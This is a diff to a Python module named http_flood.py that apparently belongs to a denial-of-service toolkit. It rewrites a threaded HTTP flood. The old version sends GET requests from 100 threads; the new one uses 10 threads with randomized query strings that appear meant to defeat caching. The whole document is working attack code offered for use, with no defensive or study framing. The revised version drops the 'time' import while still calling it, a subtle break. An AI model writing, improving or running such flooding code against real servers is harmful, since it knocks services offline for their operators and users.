@@ -1,26 +1,23 @@
-# modules/http_flood.py — Placeholder for Faizan™ HTTP Flood
+# modules/http_flood.py — Placeholder for HTTP Flood Attack
 import threading
-import time
 import requests
+import random
+import string
 
-def start_http_flood(url, duration):
-    end_time = time.time() + duration
+def random_string(length=8):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-    def flood():
+def flood_http(target_url, duration):
+    def attack():
+        end_time = time.time() + duration
         while time.time() < end_time:
             try:
-                requests.get(url)
-                print(f"Sent request to {url}")
-            except:
+                payload = {'q': random_string()}
+                requests.get(target_url, params=payload)
+            except Exception:
                 pass
 
-    threads = []
-    for _ in range(100):  # 100 threads example
-        t = threading.Thread(target=flood)
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    print("HTTP Flood finished.")
+    print(f"[+] Starting HTTP Flood on {target_url} for {duration} seconds...")
+    for _ in range(10):
+        thread = threading.Thread(target=attack)
+        thread.start()
